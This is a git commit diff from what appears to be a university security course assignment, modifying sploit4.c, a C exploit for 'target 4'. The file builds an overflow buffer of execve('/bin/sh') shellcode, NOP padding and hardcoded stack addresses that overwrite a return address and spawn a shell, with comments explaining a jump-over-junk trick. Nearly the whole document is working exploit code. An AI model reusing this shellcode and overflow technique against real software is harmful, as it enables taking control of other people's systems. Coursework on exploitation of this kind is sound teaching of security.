b24ac4800efa0f3ef32c7f8f3b0a55c74e12dbf5
Nick Kantor <nick.kantor@utexas.edu>
2016-03-30 11:43:33 -0500

    Target 4 done.

--- proj2-files/sploits/sploit4.c
+++ proj2-files/sploits/sploit4.c
@@ -11,28 +11,25 @@ int main(void)
   char *args[3];
   char *env[1];
   char buf[250];
-  char sh[] = "\xff\xff\xff\xff\xff\xff\xff\xff\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  // I added 8 bytes to the shell code so that what is executed is nop, nop, jmp $+4 (jmp to the real shell code).
+  char sh[] = "\x90\x90\xeb\x04\xff\xff\xff\xff\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
   int i = 0;
+  // fills our buffer with the shell code and meaningless nops
   for (i; i < 96; i++){
   	if(i < sizeof(sh) - 1)
 		buf[i] = sh[i];
 	else
-  		buf[i] = 'b';
+  		buf[i] = '\x90';
   }
   char sloc[4] = "\xf4\xfe\xff\xbf";
-  strcpy(&buf[i], sloc); // location of shell code.
+  strcpy(&buf[i], sloc); // location of shell code in memory.
   i += 4;
-  // char b[4] = "\x5c\xff\xff\xbf";
-  // strcpy(&buf[i], b); // location of block in our buffer
-  // i += 4;
-  // char q[4] = "\xff\xff\xff\xff";
-  // strcpy(&buf[i], q); // doesn't matter
-  // i += 4;
   char rtn[4] = "\x7c\xfd\xff\xbf";
   strcpy(&buf[i], rtn); // return address location
   i += 4;
+  // fills the rest of the buffer. Not really nessesary.
   for (i; i < 250; i++){
   	buf[i] = '\x90';
   }
@@ -45,15 +42,3 @@ int main(void)
 
   return 0;
 }
-
-// $1 = 0x8059c28 ""
-// (gdb) print q
-// $2 = 0x8059be0 ""
-// (gdb) 
-// $3 = 0x8059b78 ""
-// (gdb) 
-// 16*14-(16*7 + 8)
-
-// bffffef4
-//Location of return address bffffd7c
-// bfffff54
